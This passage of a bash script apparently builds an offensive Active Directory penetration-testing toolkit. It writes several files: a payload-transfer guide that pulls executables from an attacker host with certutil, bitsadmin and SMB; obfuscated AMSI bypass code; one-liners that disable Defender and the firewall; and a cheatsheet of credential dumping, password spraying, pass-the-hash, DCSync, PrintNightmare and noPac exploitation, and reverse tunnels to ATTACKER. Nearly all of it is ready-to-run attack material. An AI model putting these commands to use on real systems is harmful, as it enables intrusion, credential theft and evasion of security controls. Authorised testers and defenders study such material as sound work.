# Method 6: curl.exe (Win10+)
curl.exe http://KALI_IP/file.exe -o C:\Windows\Temp\file.exe
```

#### CMD
```cmd
# certutil (most reliable)
certutil -urlcache -f http://KALI_IP/file.exe C:\Windows\Temp\file.exe

# bitsadmin
bitsadmin /transfer job /download /priority high http://KALI_IP/file.exe C:\Windows\Temp\file.exe

# curl (Win10+)
curl http://KALI_IP/file.exe -o C:\Windows\Temp\file.exe
```

---

## 📂 SCENARIO 2: SMB SERVER (Great for Windows)

### Attacker - Start SMB Server
```bash
# No auth (guest)
impacket-smbserver -smb2support share .

# With auth (if guest blocked)
impacket-smbserver -smb2support -username user -password pass share .
```

### Target - Access SMB
```cmd
# Direct copy
copy \\KALI_IP\share\file.exe C:\Windows\Temp\file.exe

# Execute directly
\\KALI_IP\share\mimikatz.exe "sekurlsa::logonpasswords" "exit"
```

---

## 🔌 SCENARIO 3: EVIL-WINRM

```ruby
evil-winrm -i TARGET -u USER -p PASS
upload /path/to/local/file.exe C:\Windows\Temp\file.exe
download C:\Users\Admin\flag.txt /home/kali/flag.txt
```

---

## 🖥️ SCENARIO 4: RDP (xfreerdp)

```bash
xfreerdp /v:TARGET /u:USER /p:PASS /drive:share,/home/kali/windows-tools
# Access on Windows: \\tsclient\share\
```

---

## 📋 QUICK REFERENCE TABLE

| Method | CMD | PowerShell | Notes |
|--------|-----|------------|-------|
| certutil | ✅ | ✅ | Most reliable |
| curl.exe | ✅ | ✅ | Win10+ |
| iwr | ❌ | ✅ | Invoke-WebRequest |
| WebClient | ❌ | ✅ | .NET |
| SMB | ✅ | ✅ | Good for AD |
| Base64 | ✅ | ✅ | Last resort |

EOF

    log "INFO" "Created TRANSFER-METHODS.md"
}

create_bypass_scripts() {
    log "HEADER" "Creating Bypass Scripts"
    
    local bypass="${TOOLS_DIR}/bypass"
    
    # AMSI Bypass Collection
    cat > "${bypass}/amsi-bypass.ps1" << 'EOF'
# AMSI BYPASS COLLECTION - Try in order until one works

function Bypass-AMSI-1 {
    try {
        $a=[Ref].Assembly.GetTypes()|%{if($_.Name -like "*iUtils"){$_}}
        $b=$a.GetFields('NonPublic,Static')|?{$_.Name -like "*Context"}
        $b.SetValue($null,[IntPtr]::Zero)
        Write-Host "[+] AMSI Bypass 1 SUCCESS" -ForegroundColor Green
        return $true
    } catch { return $false }
}

function Bypass-AMSI-2 {
    try {
        $w = 'System.Management.Automation.A]m]s]i]Utils'.Replace(']','')
        $d = 'a]m]s]i]I]n]i]t]F]a]i]l]e]d'.Replace(']','')
        [Ref].Assembly.GetType($w).GetField($d,'NonPublic,Static').SetValue($null,$true)
        Write-Host "[+] AMSI Bypass 2 SUCCESS" -ForegroundColor Green
        return $true
    } catch { return $false }
}

function Invoke-AMSIBypass {
    Write-Host "[*] Attempting AMSI Bypasses..." -ForegroundColor Cyan
    if (Bypass-AMSI-1) { return }
    if (Bypass-AMSI-2) { return }
    Write-Host "[!] All bypasses failed. Try: powershell -version 2 -ep bypass" -ForegroundColor Yellow
}

Invoke-AMSIBypass
EOF

    # One-liners file
    cat > "${bypass}/oneliners.txt" << 'EOF'
# ═══════════════════════════════════════════════════════════════════════════
#                           BYPASS ONE-LINERS
# ═══════════════════════════════════════════════════════════════════════════

# AMSI Bypass - Memory Patch
$a=[Ref].Assembly.GetTypes()|%{if($_.Name -like "*iUtils"){$_}};$b=$a.GetFields('NonPublic,Static')|?{$_.Name -like "*Context"};$b.SetValue($null,[IntPtr]::Zero)

# AMSI Bypass - String Obfuscation  
$w = 'System.Management.Automation.A]m]s]i]Utils'.Replace(']',''); $d = 'a]m]s]i]I]n]i]t]F]a]i]l]e]d'.Replace(']',''); [Ref].Assembly.GetType($w).GetField($d,'NonPublic,Static').SetValue($null,$true)

# PowerShell v2 (No AMSI)
powershell -version 2 -ep bypass -file script.ps1

# Defender Disable (Admin Required)
Set-MpPreference -DisableRealtimeMonitoring $true -DisableScriptScanning $true -DisableIOAVProtection $true

# Add Exclusions
Set-MpPreference -ExclusionPath "C:\" -ExclusionExtension ".ps1",".exe",".dll",".bat"

# Disable Firewall
netsh advfirewall set allprofiles state off

# Execution Policy Bypass
Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass -Force

# APPLOCKER BYPASS PATHS
C:\Windows\Tasks\
C:\Windows\Temp\
C:\Windows\tracing\
C:\Windows\System32\spool\drivers\color\
EOF

    log "INFO" "Created bypass scripts"
}

create_server_scripts() {
    log "HEADER" "Creating Server Scripts"
    
    # HTTP Server
    cat > "${TOOLS_DIR}/serve-http.sh" << 'EOF'
#!/bin/bash
PORT="${1:-80}"
IP=$(ip -4 addr show tun0 2>/dev/null | grep -oP '(?<=inet\s)\d+(\.\d+){3}' || hostname -I | awk '{print $1}')

echo -e "\n\033[32m[+] Starting HTTP server on ${IP}:${PORT}\033[0m"
echo "# PowerShell: iwr http://${IP}:${PORT}/FILE -OutFile FILE"
echo "# CMD: certutil -urlcache -f http://${IP}:${PORT}/FILE FILE"
echo ""
python3 -m http.server ${PORT} 2>/dev/null || python -m SimpleHTTPServer ${PORT}
EOF
    chmod +x "${TOOLS_DIR}/serve-http.sh"

    # SMB Server
    cat > "${TOOLS_DIR}/serve-smb.sh" << 'EOF'
#!/bin/bash
SHARE="${1:-tools}"
IP=$(ip -4 addr show tun0 2>/dev/null | grep -oP '(?<=inet\s)\d+(\.\d+){3}' || hostname -I | awk '{print $1}')

echo -e "\n\033[32m[+] Starting SMB server: \\\\${IP}\\${SHARE}\033[0m"
echo "# copy \\\\${IP}\\${SHARE}\\FILE C:\\Windows\\Temp\\FILE"
echo ""
impacket-smbserver -smb2support "${SHARE}" .
EOF
    chmod +x "${TOOLS_DIR}/serve-smb.sh"

    log "INFO" "Created server scripts"
}

create_cheatsheet() {
    log "HEADER" "Creating Cheatsheet"
    
    cat > "${TOOLS_DIR}/cheatsheets/quick-ref.md" << 'EOF'
# 🎯 AD PENTESTING QUICK REFERENCE

## 📦 TOOL LOCATIONS
```
binaries/      - Standalone .exe files (kerbrute, etc.)
powershell/    - .ps1 scripts (PowerView, DomainPasswordSpray, etc.)
privesc/       - PrintSpoofer, GodPotato, winPEAS, SweetPotato
credentials/   - Mimikatz, Rubeus, LaZagne
enumeration/   - Seatbelt, Snaffler, SharpView, ADExplorer, Inveigh.exe
bloodhound/    - SharpHound collectors
lateral/       - PsExec, nc.exe, RunasCs
tunneling/     - Chisel, Ligolo-ng
bypass/        - AMSI bypasses, Defender disable
python-tools/  - Impacket, BloodHound.py, Responder, NetExec, etc.
users/         - Username wordlists
audit/         - PingCastle, Group3r
exploits/      - CVE exploits (PrintNightmare, noPac, etc.)
```

## 🔍 ENUMERATION WORKFLOW

### 1. Initial Enum (No Creds)
```bash
# Kerbrute user enum
./kerbrute_linux userenum -d domain.local --dc DC_IP users.txt

# enum4linux-ng
python3 enum4linux-ng.py -A TARGET_IP

# Responder (poison)
sudo python3 Responder.py -I eth0 -rdwv
```

### 2. With Creds
```bash
# BloodHound collection
./SharpHound.exe --CollectionMethods All

# NetExec enum
netexec smb TARGET -u USER -p PASS --shares
netexec smb TARGET -u USER -p PASS -M spider_plus

# Snaffler
.\Snaffler.exe -s -o snaffler.log
```

### 3. PowerShell Enum
```powershell
# Load PowerView
. .\PowerView.ps1
Get-Domain
Get-DomainUser | select samaccountname
Get-DomainGroup -AdminCount | select name
Get-DomainComputer | select dnshostname,operatingsystem

# Find interesting ACLs
Find-InterestingDomainAcl -ResolveGUIDs

# Kerberoasting
Invoke-Kerberoast -OutputFormat Hashcat | fl
```

## 🔑 CREDENTIAL ATTACKS

### Kerberoasting
```bash
# Impacket
GetUserSPNs.py domain/user:pass -dc-ip DC_IP -request

# Rubeus
.\Rubeus.exe kerberoast /nowrap
```

### ASREPRoasting
```bash
# Impacket
GetNPUsers.py domain/ -usersfile users.txt -dc-ip DC_IP -format hashcat

# PowerShell
Get-DomainUser -PreauthNotRequired | select samaccountname
```

### Password Spraying
```powershell
# DomainPasswordSpray
Import-Module .\DomainPasswordSpray.ps1
Invoke-DomainPasswordSpray -Password "Winter2024!" -OutFile spray.txt

# Kerbrute
./kerbrute_linux passwordspray -d domain.local --dc DC_IP users.txt "Winter2024!"
```

## 🚀 LATERAL MOVEMENT

### PsExec
```bash
impacket-psexec domain/user:pass@TARGET
.\PsExec64.exe \\TARGET -u domain\user -p pass cmd.exe
```

### WMIExec
```bash
impacket-wmiexec domain/user:pass@TARGET
```

### Pass-the-Hash
```bash
impacket-psexec -hashes :NTHASH domain/user@TARGET
evil-winrm -i TARGET -u USER -H NTHASH
```

## 💉 PRIVILEGE ESCALATION

### Potato Attacks (SeImpersonate)
```cmd
.\GodPotato.exe -cmd "cmd /c whoami"
.\PrintSpoofer64.exe -c "cmd /c whoami"
.\SweetPotato.exe -p cmd.exe -a "/c whoami"
```

### Credential Dumping
```cmd
# Mimikatz
.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"

# LaZagne
.\lazagne.exe all
```

## 🎯 DOMAIN ATTACKS

### DCSync
```bash
impacket-secretsdump domain/user:pass@DC_IP -just-dc-ntlm
```

### PrintNightmare
```bash
python3 CVE-2021-1675.py domain/user:pass@TARGET '\\ATTACKER\share\payload.dll'
```

### noPac (CVE-2021-42278/42287)
```bash
python3 noPac.py domain/user:pass -dc-ip DC_IP -dc-host DC_HOSTNAME -shell
```

## 📡 PIVOTING

### Chisel (SOCKS)
```bash
# Attacker
./chisel server -p 8080 --reverse

# Target
.\chisel.exe client ATTACKER:8080 R:socks
```

### Ligolo-ng
```bash
# Attacker
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up
./proxy -selfcert

# Target
.\agent.exe -connect ATTACKER:11601 -ignore-cert
```
EOF

    log "INFO" "Created cheatsheet"
}

generate_inventory() {
    log "HEADER" "Generating Inventory"
    
    cat > "${TOOLS_DIR}/INVENTORY.md" << EOF
# 📦 PAINKILLER COMPLETE TOOLS INVENTORY

Generated: $(date)
Location: ${TOOLS_DIR}

## Tool Categories

### PowerShell Scripts
$(find "${TOOLS_DIR}/powershell" -name "*.ps1" 2>/dev/null | wc -l) scripts
- PowerView.ps1, PowerUp.ps1, SharpHound.ps1
- DomainPasswordSpray.ps1, LAPSToolkit.ps1
- Inveigh.ps1, ADRecon.ps1, PrivescCheck.ps1

### Windows Binaries
$(find "${TOOLS_DIR}" -name "*.exe" 2>/dev/null | wc -l) executables
- Rubeus.exe, Mimikatz, SharpHound.exe
- Inveigh.exe (C#), Snaffler.exe, Seatbelt.exe
- PingCastle, Group3r, ADExplorer

### Python Tools
$(ls -d "${TOOLS_DIR}/python-tools"/*/ 2>/dev/null | wc -l) repositories
- Impacket, BloodHound.py, Certipy
- Responder, NetExec (CME successor)
- noPac, PrintNightmare, adidnsdump
- enum4linux-ng, ldapdomaindump, mitm6

### Username Wordlists
Location: ${TOOLS_DIR}/users/
- statistically-likely-usernames
- Common names lists

## Quick Start

\`\`\`bash
# HTTP Server
cd ${TOOLS_DIR} && ./serve-http.sh 80

# SMB Server
cd ${TOOLS_DIR} && ./serve-smb.sh tools

# RDP with shared folder
xfreerdp /v:TARGET /u:USER /p:PASS /drive:tools,${TOOLS_DIR}
\`\`\`

## Tool Counts
- Windows Executables: $(find "${TOOLS_DIR}" -name "*.exe" 2>/dev/null | wc -l)
- PowerShell Scripts: $(find "${TOOLS_DIR}" -name "*.ps1" 2>/dev/null | wc -l)
- Python Tools: $(ls -d "${TOOLS_DIR}/python-tools"/*/ 2>/dev/null | wc -l)
- Shell Scripts: $(find "${TOOLS_DIR}" -name "*.sh" 2>/dev/null | wc -l)
EOF

    log "INFO" "Generated INVENTORY.md"
}

cleanup() {
    log "HEADER" "Cleaning Up"
    
    rm -rf "${TEMP_DIR}" 2>/dev/null
    find "${TOOLS_DIR}" -type d -empty -delete 2>/dev/null
    chmod +x "${TOOLS_DIR}"/*.sh 2>/dev/null
    chmod +x "${TOOLS_DIR}"/tunneling/*linux* 2>/dev/null
    chmod +x "${TOOLS_DIR}"/binaries/*linux* 2>/dev/null
    
    log "INFO" "Cleanup complete"
}

print_summary() {
    local IP=$(ip -4 addr show tun0 2>/dev/null | grep -oP '(?<=inet\s)\d+(\.\d+){3}' || hostname -I | awk '{print $1}')
    
    echo ""
    echo -e "${GREEN}╔═══════════════════════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${GREEN}║                       DOWNLOAD COMPLETE! (ALL TOOLS)                          ║${NC}"
    echo -e "${GREEN}╚═══════════════════════════════════════════════════════════════════════════════╝${NC}"
    echo ""
    echo -e "${CYAN}📁 Tools Directory:${NC} ${TOOLS_DIR}"
    echo -e "${CYAN}📡 Your IP:${NC} ${IP}"
    echo ""
    echo -e "${YELLOW}🚀 QUICK START:${NC}"
    echo ""
    echo -e "${BLUE}# HTTP Server:${NC}"
    echo "  cd ${TOOLS_DIR} && ./serve-http.sh 80"
    echo ""
    echo -e "${BLUE}# SMB Server:${NC}"
    echo "  cd ${TOOLS_DIR} && ./serve-smb.sh tools"
    echo ""
    echo -e "${BLUE}# RDP with folder share:${NC}"
    echo "  xfreerdp /v:TARGET /u:USER /p:PASS /drive:tools,${TOOLS_DIR}"
    echo ""
    echo -e "${YELLOW}📖 DOCUMENTATION:${NC}"
    echo "  ${TOOLS_DIR}/transfer/TRANSFER-METHODS.md  - All transfer methods"
    echo "  ${TOOLS_DIR}/bypass/oneliners.txt          - AMSI/Defender bypasses"
    echo "  ${TOOLS_DIR}/cheatsheets/quick-ref.md      - AD pentesting reference"
    echo "  ${TOOLS_DIR}/INVENTORY.md                  - Full tool inventory"
    echo ""
    echo -e "${YELLOW}📦 NEW ADDITIONS:${NC}"
    echo "  - users/                  - Username wordlists (statistically-likely-usernames)"
    echo "  - python-tools/Responder  - LLMNR/NBT-NS poisoning"
    echo "  - python-tools/NetExec    - CrackMapExec successor"
    echo "  - python-tools/noPac      - CVE-2021-42278/42287 exploit"
    echo "  - python-tools/PrintNightmare - CVE-2021-1675"
    echo "  - enumeration/Inveigh.exe - C# Inveigh"
    echo "  - audit/PingCastle        - AD security auditing"
    echo "  - audit/Group3r           - GPO security audit"
    echo ""
    echo -e "${GREEN}✅ Ready to go!${NC}"
}

#=============================================================================
# MAIN
#=============================================================================

main() {
    banner
    
    log "INFO" "Starting Painkiller COMPLETE - Target: ${TOOLS_DIR}"
    
    check_dependencies
    create_directories
    download_powershell_scripts
    download_binaries
    copy_kali_tools
    clone_python_tools
    clone_wordlists
    create_transfer_scripts
    create_bypass_scripts
    create_server_scripts
    create_cheatsheet
    generate_inventory
    cleanup
    
    print_summary
}

main "$@"
